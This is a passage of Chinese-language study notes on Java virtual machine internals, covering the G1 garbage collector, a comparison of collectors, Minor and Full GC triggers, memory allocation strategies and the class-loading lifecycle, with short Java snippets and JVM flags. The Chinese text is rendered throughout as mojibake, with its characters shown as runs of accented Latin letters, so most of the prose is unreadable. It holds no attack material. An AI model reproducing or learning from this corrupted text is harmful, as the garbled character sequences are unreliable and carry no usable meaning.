Setï¼Œåœ¨åšå¯è¾¾æ€§åˆ†æçš„æ—¶å€™å°±å¯ä»¥é¿å…å…¨å †æ‰«æã€‚ å¦‚æœä¸è®¡ç®—ç»´æŠ¤ Remembered Set çš„æ“ä½œï¼ŒG1 æ”¶é›†å™¨çš„è¿ä½œå¤§è‡´å¯åˆ’åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š åˆå§‹æ ‡è®° å¹¶å‘æ ‡è®° æœ€ç»ˆæ ‡è®°ï¼šä¸ºäº†ä¿®æ­£åœ¨å¹¶å‘æ ‡è®°æœŸé—´å› ç”¨æˆ·ç¨‹åºç»§ç»­è¿ä½œè€Œå¯¼è‡´æ ‡è®°äº§ç”Ÿå˜åŠ¨çš„é‚£ä¸€éƒ¨åˆ†æ ‡è®°è®°å½•ï¼Œè™šæ‹Ÿæœºå°†è¿™æ®µæ—¶é—´å¯¹è±¡å˜åŒ–è®°å½•åœ¨çº¿ç¨‹çš„ Remembered Set Logs é‡Œé¢ï¼Œæœ€ç»ˆæ ‡è®°é˜¶æ®µéœ€è¦æŠŠ Remembered Set Logs çš„æ•°æ®åˆå¹¶åˆ° Remembered Set ä¸­ã€‚è¿™é˜¶æ®µéœ€è¦åœé¡¿çº¿ç¨‹ï¼Œä½†æ˜¯å¯å¹¶è¡Œæ‰§è¡Œã€‚ ç­›é€‰å›æ”¶ï¼šé¦–å…ˆå¯¹å„ä¸ª Region ä¸­çš„å›æ”¶ä»·å€¼å’Œæˆæœ¬è¿›è¡Œæ’åºï¼Œæ ¹æ®ç”¨æˆ·æ‰€æœŸæœ›çš„ GC åœé¡¿æ—¶é—´æ¥åˆ¶å®šå›æ”¶è®¡åˆ’ã€‚æ­¤é˜¶æ®µå…¶å®ä¹Ÿå¯ä»¥åšåˆ°ä¸ç”¨æˆ·ç¨‹åºä¸€èµ·å¹¶å‘æ‰§è¡Œï¼Œä½†æ˜¯å› ä¸ºåªå›æ”¶ä¸€éƒ¨åˆ† Regionï¼Œæ—¶é—´æ˜¯ç”¨æˆ·å¯æ§åˆ¶çš„ï¼Œè€Œä¸”åœé¡¿ç”¨æˆ·çº¿ç¨‹å°†å¤§å¹…åº¦æé«˜æ”¶é›†æ•ˆç‡ã€‚ å…·å¤‡å¦‚ä¸‹ç‰¹ç‚¹ï¼š ç©ºé—´æ•´åˆï¼šæ•´ä½“æ¥çœ‹æ˜¯åŸºäºâ€œæ ‡è®° - æ•´ç†â€ç®—æ³•å®ç°çš„æ”¶é›†å™¨ï¼Œä»å±€éƒ¨ï¼ˆä¸¤ä¸ª Region ä¹‹é—´ï¼‰ä¸Šæ¥çœ‹æ˜¯åŸºäºâ€œå¤åˆ¶â€ç®—æ³•å®ç°çš„ï¼Œè¿™æ„å‘³ç€è¿è¡ŒæœŸé—´ä¸ä¼šäº§ç”Ÿå†…å­˜ç©ºé—´ç¢ç‰‡ã€‚ å¯é¢„æµ‹çš„åœé¡¿ï¼šèƒ½è®©ä½¿ç”¨è€…æ˜ç¡®æŒ‡å®šåœ¨ä¸€ä¸ªé•¿åº¦ä¸º M æ¯«ç§’çš„æ—¶é—´ç‰‡æ®µå†…ï¼Œæ¶ˆè€—åœ¨ GC ä¸Šçš„æ—¶é—´ä¸å¾—è¶…è¿‡ N æ¯«ç§’ã€‚ æ›´è¯¦ç»†å†…å®¹è¯·å‚è€ƒï¼šGetting Started with the G1 Garbage Collector 8. æ¯”è¾ƒ æ”¶é›†å™¨ å•çº¿ç¨‹/å¹¶è¡Œ ä¸²è¡Œ/å¹¶å‘ æ–°ç”Ÿä»£/è€å¹´ä»£ æ”¶é›†ç®—æ³• ç›®æ ‡ é€‚ç”¨åœºæ™¯ Serial å•çº¿ç¨‹ ä¸²è¡Œ æ–°ç”Ÿä»£ å¤åˆ¶ å“åº”é€Ÿåº¦ä¼˜å…ˆ å• CPU ç¯å¢ƒä¸‹çš„ Client æ¨¡å¼ Serial Old å•çº¿ç¨‹ ä¸²è¡Œ è€å¹´ä»£ æ ‡è®°-æ•´ç† å“åº”é€Ÿåº¦ä¼˜å…ˆ å• CPU ç¯å¢ƒä¸‹çš„ Client æ¨¡å¼ã€CMS çš„åå¤‡é¢„æ¡ˆ ParNew å¹¶è¡Œ ä¸²è¡Œ æ–°ç”Ÿä»£ å¤åˆ¶ç®—æ³• å“åº”é€Ÿåº¦ä¼˜å…ˆ å¤š CPU ç¯å¢ƒæ—¶åœ¨ Server æ¨¡å¼ä¸‹ä¸ CMS é…åˆ Parallel Scavenge å¹¶è¡Œ ä¸²è¡Œ æ–°ç”Ÿä»£ å¤åˆ¶ç®—æ³• ååé‡ä¼˜å…ˆ åœ¨åå°è¿ç®—è€Œä¸éœ€è¦å¤ªå¤šäº¤äº’çš„ä»»åŠ¡ Parallel Old å¹¶è¡Œ ä¸²è¡Œ è€å¹´ä»£ æ ‡è®°-æ•´ç† ååé‡ä¼˜å…ˆ åœ¨åå°è¿ç®—è€Œä¸éœ€è¦å¤ªå¤šäº¤äº’çš„ä»»åŠ¡ CMS å¹¶è¡Œ å¹¶å‘ è€å¹´ä»£ æ ‡è®°-æ¸…é™¤ å“åº”é€Ÿåº¦ä¼˜å…ˆ é›†ä¸­åœ¨äº’è”ç½‘ç«™æˆ– B/S ç³»ç»ŸæœåŠ¡ç«¯ä¸Šçš„ Java åº”ç”¨ G1 å¹¶è¡Œ å¹¶å‘ æ–°ç”Ÿä»£ + è€å¹´ä»£ æ ‡è®°-æ•´ç† + å¤åˆ¶ç®—æ³• å“åº”é€Ÿåº¦ä¼˜å…ˆ é¢å‘æœåŠ¡ç«¯åº”ç”¨ï¼Œå°†æ¥æ›¿æ¢ CMS å†…å­˜åˆ†é…ä¸å›æ”¶ç­–ç•¥1. Minor GC å’Œ Full GC Minor GCï¼šå‘ç”Ÿåœ¨æ–°ç”Ÿä»£ä¸Šï¼Œå› ä¸ºæ–°ç”Ÿä»£å¯¹è±¡å­˜æ´»æ—¶é—´å¾ˆçŸ­ï¼Œå› æ­¤ Minor GC ä¼šé¢‘ç¹æ‰§è¡Œï¼Œæ‰§è¡Œçš„é€Ÿåº¦ä¸€èˆ¬ä¹Ÿä¼šæ¯”è¾ƒå¿«ã€‚ Full GCï¼šå‘ç”Ÿåœ¨è€å¹´ä»£ä¸Šï¼Œè€å¹´ä»£å¯¹è±¡å…¶å­˜æ´»æ—¶é—´é•¿ï¼Œå› æ­¤ Full GC å¾ˆå°‘æ‰§è¡Œï¼Œæ‰§è¡Œé€Ÿåº¦ä¼šæ¯” Minor GC æ…¢å¾ˆå¤šã€‚ 2. å†…å­˜åˆ†é…ç­–ç•¥ï¼ˆä¸€ï¼‰å¯¹è±¡ä¼˜å…ˆåœ¨ Eden åˆ†é… å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¯¹è±¡åœ¨æ–°ç”Ÿä»£ Eden åŒºåˆ†é…ï¼Œå½“ Eden åŒºç©ºé—´ä¸å¤Ÿæ—¶ï¼Œå‘èµ· Minor GCã€‚ ï¼ˆäºŒï¼‰å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£ å¤§å¯¹è±¡æ˜¯æŒ‡éœ€è¦è¿ç»­å†…å­˜ç©ºé—´çš„å¯¹è±¡ï¼Œæœ€å…¸å‹çš„å¤§å¯¹è±¡æ˜¯é‚£ç§å¾ˆé•¿çš„å­—ç¬¦ä¸²ä»¥åŠæ•°ç»„ã€‚ ç»å¸¸å‡ºç°å¤§å¯¹è±¡ä¼šæå‰è§¦å‘åƒåœ¾æ”¶é›†ä»¥è·å–è¶³å¤Ÿçš„è¿ç»­ç©ºé—´åˆ†é…ç»™å¤§å¯¹è±¡ã€‚ -XX:PretenureSizeThresholdï¼Œå¤§äºæ­¤å€¼çš„å¯¹è±¡ç›´æ¥åœ¨è€å¹´ä»£åˆ†é…ï¼Œé¿å…åœ¨ Eden åŒºå’Œ Survivor åŒºä¹‹é—´çš„å¤§é‡å†…å­˜å¤åˆ¶ã€‚ ï¼ˆä¸‰ï¼‰é•¿æœŸå­˜æ´»çš„å¯¹è±¡è¿›å…¥è€å¹´ä»£ ä¸ºå¯¹è±¡å®šä¹‰å¹´é¾„è®¡æ•°å™¨ï¼Œå¯¹è±¡åœ¨ Eden å‡ºç”Ÿå¹¶ç»è¿‡ Minor GC ä¾ç„¶å­˜æ´»ï¼Œå°†ç§»åŠ¨åˆ° Survivor ä¸­ï¼Œå¹´é¾„å°±å¢åŠ  1 å²ï¼Œå¢åŠ åˆ°ä¸€å®šå¹´é¾„åˆ™ç§»åŠ¨åˆ°è€å¹´ä»£ä¸­ã€‚ -XX:MaxTenuringThreshold ç”¨æ¥å®šä¹‰å¹´é¾„çš„é˜ˆå€¼ã€‚ ï¼ˆå››ï¼‰åŠ¨æ€å¯¹è±¡å¹´é¾„åˆ¤å®š è™šæ‹Ÿæœºå¹¶ä¸æ˜¯æ°¸è¿œåœ°è¦æ±‚å¯¹è±¡çš„å¹´é¾„å¿…é¡»è¾¾åˆ° MaxTenuringThreshold æ‰èƒ½æ™‹å‡è€å¹´ä»£ï¼Œå¦‚æœåœ¨ Survivor åŒºä¸­ç›¸åŒå¹´é¾„æ‰€æœ‰å¯¹è±¡å¤§å°çš„æ€»å’Œå¤§äº Survivor ç©ºé—´çš„ä¸€åŠï¼Œåˆ™å¹´é¾„å¤§äºæˆ–ç­‰äºè¯¥å¹´é¾„çš„å¯¹è±¡å¯ä»¥ç›´æ¥è¿›å…¥è€å¹´ä»£ï¼Œæ— éœ€ç­‰åˆ° MaxTenuringThreshold ä¸­è¦æ±‚çš„å¹´é¾„ã€‚ ï¼ˆäº”ï¼‰ç©ºé—´åˆ†é…æ‹…ä¿ åœ¨å‘ç”Ÿ Minor GC ä¹‹å‰ï¼Œè™šæ‹Ÿæœºå…ˆæ£€æŸ¥è€å¹´ä»£æœ€å¤§å¯ç”¨çš„è¿ç»­ç©ºé—´æ˜¯å¦å¤§äºæ–°ç”Ÿä»£æ‰€æœ‰å¯¹è±¡æ€»ç©ºé—´ï¼Œå¦‚æœæ¡ä»¶æˆç«‹çš„è¯ï¼Œé‚£ä¹ˆ Minor GC å¯ä»¥ç¡®è®¤æ˜¯å®‰å…¨çš„ï¼›å¦‚æœä¸æˆç«‹çš„è¯è™šæ‹Ÿæœºä¼šæŸ¥çœ‹ HandlePromotionFailure è®¾ç½®å€¼æ˜¯å¦å…è®¸æ‹…ä¿å¤±è´¥ï¼Œå¦‚æœå…è®¸é‚£ä¹ˆå°±ä¼šç»§ç»­æ£€æŸ¥è€å¹´ä»£æœ€å¤§å¯ç”¨çš„è¿ç»­ç©ºé—´æ˜¯å¦å¤§äºå†æ¬¡æ™‹å‡åˆ°è€å¹´ä»£å¯¹è±¡çš„å¹³å‡å¤§å°ï¼Œå¦‚æœå¤§äºï¼Œå°†å°è¯•ç€è¿›è¡Œä¸€æ¬¡ Minor GCï¼Œå°½ç®¡è¿™æ¬¡ Minor GC æ˜¯æœ‰é£é™©çš„ï¼›å¦‚æœå°äºï¼Œæˆ–è€… HandlePromotionFailure è®¾ç½®ä¸å…è®¸å†’é™©ï¼Œé‚£è¿™æ—¶ä¹Ÿè¦æ”¹ä¸ºè¿›è¡Œä¸€æ¬¡ Full GCã€‚ 3. Full GC çš„è§¦å‘æ¡ä»¶å¯¹äº Minor GCï¼Œå…¶è§¦å‘æ¡ä»¶éå¸¸ç®€å•ï¼Œå½“ Eden åŒºç©ºé—´æ»¡æ—¶ï¼Œå°±å°†è§¦å‘ä¸€æ¬¡ Minor GCã€‚è€Œ Full GC åˆ™ç›¸å¯¹å¤æ‚ï¼Œæœ‰ä»¥ä¸‹æ¡ä»¶ï¼š ï¼ˆä¸€ï¼‰è°ƒç”¨ System.gc() åªæ˜¯å»ºè®®è™šæ‹Ÿæœºæ‰§è¡Œ Full GCï¼Œä½†æ˜¯è™šæ‹Ÿæœºä¸ä¸€å®šçœŸæ­£å»æ‰§è¡Œã€‚ä¸å»ºè®®ä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œè€Œæ˜¯è®©è™šæ‹Ÿæœºç®¡ç†å†…å­˜ã€‚ ï¼ˆäºŒï¼‰è€å¹´ä»£ç©ºé—´ä¸è¶³ è€å¹´ä»£ç©ºé—´ä¸è¶³çš„å¸¸è§åœºæ™¯ä¸ºå‰æ–‡æ‰€è®²çš„å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£ã€é•¿æœŸå­˜æ´»çš„å¯¹è±¡è¿›å…¥è€å¹´ä»£ç­‰ã€‚ ä¸ºäº†é¿å…ä»¥ä¸ŠåŸå› å¼•èµ·çš„ Full GCï¼Œåº”å½“å°½é‡ä¸è¦åˆ›å»ºè¿‡å¤§çš„å¯¹è±¡ä»¥åŠæ•°ç»„ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå¯ä»¥é€šè¿‡ -Xmn è™šæ‹Ÿæœºå‚æ•°è°ƒå¤§æ–°ç”Ÿä»£çš„å¤§å°ï¼Œè®©å¯¹è±¡å°½é‡åœ¨æ–°ç”Ÿä»£è¢«å›æ”¶æ‰ï¼Œä¸è¿›å…¥è€å¹´ä»£ã€‚è¿˜å¯ä»¥é€šè¿‡ -XX:MaxTenuringThreshold è°ƒå¤§å¯¹è±¡è¿›å…¥è€å¹´ä»£çš„å¹´é¾„ï¼Œè®©å¯¹è±¡åœ¨æ–°ç”Ÿä»£å¤šå­˜æ´»ä¸€æ®µæ—¶é—´ã€‚ ï¼ˆä¸‰ï¼‰ç©ºé—´åˆ†é…æ‹…ä¿å¤±è´¥ ä½¿ç”¨å¤åˆ¶ç®—æ³•çš„ Minor GC éœ€è¦è€å¹´ä»£çš„å†…å­˜ç©ºé—´ä½œæ‹…ä¿ï¼Œå¦‚æœæ‹…ä¿å¤±è´¥ä¼šæ‰§è¡Œä¸€æ¬¡ Full GCã€‚å…·ä½“å†…å®¹è¯·å‚è€ƒä¸Šé¢çš„ç¬¬äº”å°èŠ‚ã€‚ ï¼ˆå››ï¼‰JDK 1.7 åŠä»¥å‰çš„æ°¸ä¹…ä»£ç©ºé—´ä¸è¶³ åœ¨ JDK 1.7 åŠä»¥å‰ï¼ŒHotSpot è™šæ‹Ÿæœºä¸­çš„æ–¹æ³•åŒºæ˜¯ç”¨æ°¸ä¹…ä»£å®ç°çš„ï¼Œæ°¸ä¹…ä»£ä¸­å­˜æ”¾çš„ä¸ºä¸€äº› Class çš„ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ç­‰æ•°æ®ï¼Œå½“ç³»ç»Ÿä¸­è¦åŠ è½½çš„ç±»ã€åå°„çš„ç±»å’Œè°ƒç”¨çš„æ–¹æ³•è¾ƒå¤šæ—¶ï¼Œæ°¸ä¹…ä»£å¯èƒ½ä¼šè¢«å æ»¡ï¼Œåœ¨æœªé…ç½®ä¸ºé‡‡ç”¨ CMS GC çš„æƒ…å†µä¸‹ä¹Ÿä¼šæ‰§è¡Œ Full GCã€‚å¦‚æœç»è¿‡ Full GC ä»ç„¶å›æ”¶ä¸äº†ï¼Œé‚£ä¹ˆè™šæ‹Ÿæœºä¼šæŠ›å‡º java.lang.OutOfMemoryErrorã€‚ä¸ºé¿å…ä»¥ä¸ŠåŸå› å¼•èµ·çš„ Full GCï¼Œå¯é‡‡ç”¨çš„æ–¹æ³•ä¸ºå¢å¤§æ°¸ä¹…ä»£ç©ºé—´æˆ–è½¬ä¸ºä½¿ç”¨ CMS GCã€‚ ï¼ˆäº”ï¼‰Concurrent Mode Failure æ‰§è¡Œ CMS GC çš„è¿‡ç¨‹ä¸­åŒæ—¶æœ‰å¯¹è±¡è¦æ”¾å…¥è€å¹´ä»£ï¼Œè€Œæ­¤æ—¶è€å¹´ä»£ç©ºé—´ä¸è¶³ï¼ˆæœ‰æ—¶å€™â€œç©ºé—´ä¸è¶³â€æ˜¯æŒ‡ CMS GC å½“å‰çš„æµ®åŠ¨åƒåœ¾è¿‡å¤šå¯¼è‡´æš‚æ—¶æ€§çš„ç©ºé—´ä¸è¶³ï¼‰ï¼Œä¾¿ä¼šæŠ¥ Concurrent Mode Failure é”™è¯¯ï¼Œå¹¶è§¦å‘ Full GCã€‚ ä¸‰ã€ç±»åŠ è½½æœºåˆ¶ç±»æ˜¯åœ¨è¿è¡ŒæœŸé—´åŠ¨æ€åŠ è½½çš„ã€‚ ç±»çš„ç”Ÿå‘½å‘¨æœŸ åŒ…æ‹¬ä»¥ä¸‹ 7 ä¸ªé˜¶æ®µï¼š åŠ è½½ï¼ˆLoadingï¼‰ éªŒè¯ï¼ˆVerificationï¼‰ å‡†å¤‡ï¼ˆPreparationï¼‰ è§£æï¼ˆResolutionï¼‰ åˆå§‹åŒ–ï¼ˆInitializationï¼‰ ä½¿ç”¨ï¼ˆUsingï¼‰ å¸è½½ï¼ˆUnloadingï¼‰ å…¶ä¸­è§£æè¿‡ç¨‹åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥åœ¨åˆå§‹åŒ–é˜¶æ®µä¹‹åå†å¼€å§‹ï¼Œè¿™æ˜¯ä¸ºäº†æ”¯æŒ Java çš„åŠ¨æ€ç»‘å®šã€‚ ç±»åˆå§‹åŒ–æ—¶æœºè™šæ‹Ÿæœºè§„èŒƒä¸­å¹¶æ²¡æœ‰å¼ºåˆ¶çº¦æŸä½•æ—¶è¿›è¡ŒåŠ è½½ï¼Œä½†æ˜¯è§„èŒƒä¸¥æ ¼è§„å®šäº†æœ‰ä¸”åªæœ‰ä¸‹åˆ—äº”ç§æƒ…å†µå¿…é¡»å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ï¼ˆåŠ è½½ã€éªŒè¯ã€å‡†å¤‡éƒ½ä¼šéšä¹‹å‘ç”Ÿï¼‰ï¼š é‡åˆ° newã€getstaticã€putstaticã€invokestatic è¿™å››æ¡å­—èŠ‚ç æŒ‡ä»¤æ—¶ï¼Œå¦‚æœç±»æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™å¿…é¡»å…ˆè§¦å‘å…¶åˆå§‹åŒ–ã€‚æœ€å¸¸è§çš„ç”Ÿæˆè¿™ 4 æ¡æŒ‡ä»¤çš„åœºæ™¯æ˜¯ï¼šä½¿ç”¨ new å…³é”®å­—å®ä¾‹åŒ–å¯¹è±¡çš„æ—¶å€™ï¼›è¯»å–æˆ–è®¾ç½®ä¸€ä¸ªç±»çš„é™æ€å­—æ®µï¼ˆè¢« final ä¿®é¥°ã€å·²åœ¨ç¼–è¯‘æœŸæŠŠç»“æœæ”¾å…¥å¸¸é‡æ± çš„é™æ€å­—æ®µé™¤å¤–ï¼‰çš„æ—¶å€™ï¼›ä»¥åŠè°ƒç”¨ä¸€ä¸ªç±»çš„é™æ€æ–¹æ³•çš„æ—¶å€™ã€‚ ä½¿ç”¨ java.lang.reflect åŒ…çš„æ–¹æ³•å¯¹ç±»è¿›è¡Œåå°„è°ƒç”¨çš„æ—¶å€™ï¼Œå¦‚æœç±»æ²¡æœ‰è¿›è¡Œåˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶åˆå§‹åŒ–ã€‚ å½“åˆå§‹åŒ–ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°å…¶çˆ¶ç±»è¿˜æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶çˆ¶ç±»çš„åˆå§‹åŒ–ã€‚ å½“è™šæ‹Ÿæœºå¯åŠ¨æ—¶ï¼Œç”¨æˆ·éœ€è¦æŒ‡å®šä¸€ä¸ªè¦æ‰§è¡Œçš„ä¸»ç±»ï¼ˆåŒ…å« main() æ–¹æ³•çš„é‚£ä¸ªç±»ï¼‰ï¼Œè™šæ‹Ÿæœºä¼šå…ˆåˆå§‹åŒ–è¿™ä¸ªä¸»ç±»ï¼› å½“ä½¿ç”¨ JDK 1.7 çš„åŠ¨æ€è¯­è¨€æ”¯æŒæ—¶ï¼Œå¦‚æœä¸€ä¸ª java.lang.invoke.MethodHandle å®ä¾‹æœ€åçš„è§£æç»“æœä¸º REF_getStatic, REF_putStatic, REF_invokeStatic çš„æ–¹æ³•å¥æŸ„ï¼Œå¹¶ä¸”è¿™ä¸ªæ–¹æ³•å¥æŸ„æ‰€å¯¹åº”çš„ç±»æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶åˆå§‹åŒ–ï¼› ä»¥ä¸Š 5 ç§åœºæ™¯ä¸­çš„è¡Œä¸ºç§°ä¸ºå¯¹ä¸€ä¸ªç±»è¿›è¡Œä¸»åŠ¨å¼•ç”¨ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ‰€æœ‰å¼•ç”¨ç±»çš„æ–¹å¼éƒ½ä¸ä¼šè§¦å‘åˆå§‹åŒ–ï¼Œç§°ä¸ºè¢«åŠ¨å¼•ç”¨ã€‚è¢«åŠ¨å¼•ç”¨çš„å¸¸è§ä¾‹å­åŒ…æ‹¬ï¼š é€šè¿‡å­ç±»å¼•ç”¨çˆ¶ç±»çš„é™æ€å­—æ®µï¼Œä¸ä¼šå¯¼è‡´å­ç±»åˆå§‹åŒ–ã€‚ 1System.out.println(SubClass.value); // value å­—æ®µåœ¨ SuperClass ä¸­å®šä¹‰ é€šè¿‡æ•°ç»„å®šä¹‰æ¥å¼•ç”¨ç±»ï¼Œä¸ä¼šè§¦å‘æ­¤ç±»çš„åˆå§‹åŒ–ã€‚è¯¥è¿‡ç¨‹ä¼šå¯¹æ•°ç»„ç±»è¿›è¡Œåˆå§‹åŒ–ï¼Œæ•°ç»„ç±»æ˜¯ä¸€ä¸ªç”±è™šæ‹Ÿæœºè‡ªåŠ¨ç”Ÿæˆçš„ã€ç›´æ¥ç»§æ‰¿è‡ª Object çš„å­ç±»ï¼Œå…¶ä¸­åŒ…å«äº†æ•°ç»„çš„å±æ€§å’Œæ–¹æ³•ã€‚ 1SuperClass[] sca = new SuperClass[10]; å¸¸é‡åœ¨ç¼–è¯‘é˜¶æ®µä¼šå­˜å…¥è°ƒç”¨ç±»çš„å¸¸é‡æ± ä¸­ï¼Œæœ¬è´¨ä¸Šå¹¶æ²¡æœ‰ç›´æ¥å¼•ç”¨åˆ°å®šä¹‰å¸¸é‡çš„ç±»ï¼Œå› æ­¤ä¸ä¼šè§¦å‘å®šä¹‰å¸¸é‡çš„ç±»çš„åˆå§‹åŒ–ã€‚ 1System.out.println(ConstClass.HELLOWORLD); ç±»åŠ è½½è¿‡ç¨‹åŒ…å«äº†åŠ è½½ã€éªŒè¯ã€å‡†å¤‡ã€è§£æå’Œåˆå§‹åŒ–è¿™ 5 ä¸ªé˜¶æ®µã€‚ 1. åŠ è½½åŠ è½½æ˜¯ç±»åŠ è½½çš„ä¸€ä¸ªé˜¶æ®µï¼Œæ³¨æ„ä¸è¦æ··æ·†ã€‚ åŠ è½½è¿‡ç¨‹å®Œæˆä»¥ä¸‹ä¸‰ä»¶äº‹ï¼š é€šè¿‡ä¸€ä¸ªç±»çš„å…¨é™å®šåæ¥è·å–å®šä¹‰æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµã€‚ å°†è¿™ä¸ªå­—èŠ‚æµæ‰€ä»£è¡¨çš„é™æ€å­˜å‚¨ç»“æ„è½¬åŒ–ä¸ºæ–¹æ³•åŒºçš„è¿è¡Œæ—¶å­˜å‚¨ç»“æ„ã€‚ åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„ Class å¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºè¿™ä¸ªç±»çš„å„ç§æ•°æ®çš„è®¿é—®å…¥å£ã€‚ å…¶ä¸­äºŒè¿›åˆ¶å­—èŠ‚æµå¯ä»¥ä»ä»¥ä¸‹æ–¹å¼ä¸­è·å–ï¼š ä» ZIP åŒ…è¯»å–ï¼Œè¿™å¾ˆå¸¸è§ï¼Œæœ€ç»ˆæˆä¸ºæ—¥å JARã€EARã€WAR æ ¼å¼çš„åŸºç¡€ã€‚ ä»ç½‘ç»œä¸­è·å–ï¼Œè¿™ç§åœºæ™¯æœ€å…¸å‹çš„åº”ç”¨æ˜¯ Appletã€‚ è¿è¡Œæ—¶è®¡ç®—ç”Ÿæˆï¼Œè¿™ç§åœºæ™¯ä½¿ç”¨å¾—æœ€å¤šå¾—å°±æ˜¯åŠ¨æ€ä»£ç†æŠ€æœ¯ï¼Œåœ¨ java.lang.reflect.Proxy ä¸­ï¼Œå°±æ˜¯ç”¨äº† ProxyGenerator.generateProxyClass çš„ä»£ç†ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµã€‚ ç”±å…¶ä»–æ–‡ä»¶ç”Ÿæˆï¼Œå…¸å‹åœºæ™¯æ˜¯ JSP åº”ç”¨ï¼Œå³ç”± JSP æ–‡ä»¶ç”Ÿæˆå¯¹åº”çš„ Class ç±»ã€‚ ä»æ•°æ®åº“è¯»å–ï¼Œè¿™ç§åœºæ™¯ç›¸å¯¹å°‘è§ï¼Œä¾‹å¦‚æœ‰äº›ä¸­é—´ä»¶æœåŠ¡å™¨ï¼ˆå¦‚ SAP Netweaverï¼‰å¯ä»¥é€‰æ‹©æŠŠç¨‹åºå®‰è£…åˆ°æ•°æ®åº“ä¸­æ¥å®Œæˆç¨‹åºä»£ç åœ¨é›†ç¾¤é—´çš„åˆ†å‘ã€‚â€¦ 2. éªŒè¯ç¡®ä¿ Class æ–‡ä»¶çš„å­—èŠ‚æµä¸­åŒ…å«çš„ä¿¡æ¯ç¬¦åˆå½“å‰è™šæ‹Ÿæœºçš„è¦æ±‚ï¼Œå¹¶ä¸”ä¸ä¼šå±å®³è™šæ‹Ÿæœºè‡ªèº«çš„å®‰å…¨ã€‚ æ–‡ä»¶æ ¼å¼éªŒè¯ï¼šéªŒè¯å­—èŠ‚æµæ˜¯å¦ç¬¦åˆ Class æ–‡ä»¶æ ¼å¼çš„è§„èŒƒï¼Œå¹¶ä¸”èƒ½è¢«å½“å‰ç‰ˆæœ¬çš„è™šæ‹Ÿæœºå¤„ç†ã€‚ å…ƒæ•°æ®éªŒè¯ï¼šå¯¹å­—èŠ‚ç æè¿°çš„ä¿¡æ¯è¿›è¡Œè¯­ä¹‰åˆ†æï¼Œä»¥ä¿è¯å…¶æè¿°çš„ä¿¡æ¯ç¬¦åˆ Java è¯­è¨€è§„èŒƒçš„è¦æ±‚ã€‚ å­—èŠ‚ç éªŒè¯ï¼šé€šè¿‡æ•°æ®æµå’Œæ§åˆ¶æµåˆ†æï¼Œç¡®ä¿ç¨‹åºè¯­ä¹‰æ˜¯åˆæ³•ã€ç¬¦åˆé€»è¾‘çš„ã€‚ ç¬¦å·å¼•ç”¨éªŒè¯ï¼šå‘ç”Ÿåœ¨è™šæ‹Ÿæœºå°†ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨çš„æ—¶å€™ï¼Œå¯¹ç±»è‡ªèº«ä»¥å¤–ï¼ˆå¸¸é‡æ± ä¸­çš„å„ç§ç¬¦å·å¼•ç”¨ï¼‰çš„ä¿¡æ¯è¿›è¡ŒåŒ¹é…æ€§æ ¡éªŒã€‚ 3. å‡†å¤‡ç±»å˜é‡æ˜¯è¢« static ä¿®é¥°çš„å˜é‡ï¼Œå‡†å¤‡é˜¶æ®µä¸ºç±»å˜é‡åˆ†é…å†…å­˜å¹¶è®¾ç½®åˆå§‹å€¼ï¼Œä½¿ç”¨çš„æ˜¯æ–¹æ³•åŒºçš„å†…å­˜ã€‚ å®ä¾‹å˜é‡ä¸ä¼šåœ¨è¿™é˜¶æ®µåˆ†é…å†…å­˜ï¼Œå®ƒå°†ä¼šåœ¨å¯¹è±¡å®ä¾‹åŒ–æ—¶éšç€å¯¹è±¡ä¸€èµ·åˆ†é…åœ¨ Java å †ä¸­ã€‚ï¼ˆå®ä¾‹åŒ–ä¸æ˜¯ç±»åŠ è½½çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œç±»åŠ è½½å‘ç”Ÿåœ¨æ‰€æœ‰å®ä¾‹åŒ–æ“ä½œä¹‹å‰ï¼Œå¹¶ä¸”ç±»åŠ è½½åªè¿›è¡Œä¸€æ¬¡ï¼Œå®ä¾‹åŒ–å¯ä»¥è¿›è¡Œå¤šæ¬¡ï¼‰ åˆå§‹å€¼ä¸€èˆ¬ä¸º 0 å€¼ï¼Œä¾‹å¦‚ä¸‹é¢çš„ç±»å˜é‡ value è¢«åˆå§‹åŒ–ä¸º 0 è€Œä¸æ˜¯ 123ã€‚ 1public static int value = 123; å¦‚æœç±»å˜é‡æ˜¯å¸¸é‡ï¼Œé‚£ä¹ˆä¼šæŒ‰ç…§è¡¨è¾¾å¼æ¥è¿›è¡Œåˆå§‹åŒ–ï¼Œè€Œä¸æ˜¯èµ‹å€¼ä¸º 0ã€‚ 1public static final int value = 123; 4. è§£æå°†å¸¸é‡æ± çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹ã€‚ 5. åˆå§‹åŒ–åˆå§‹åŒ–é˜¶æ®µæ‰çœŸæ­£å¼€å§‹æ‰§è¡Œç±»ä¸­çš„å®šä¹‰çš„ Java ç¨‹åºä»£ç ã€‚åˆå§‹åŒ–é˜¶æ®µå³è™šæ‹Ÿæœºæ‰§è¡Œç±»æ„é€ å™¨ &lt;clinit&gt;() æ–¹æ³•çš„è¿‡ç¨‹ã€‚ 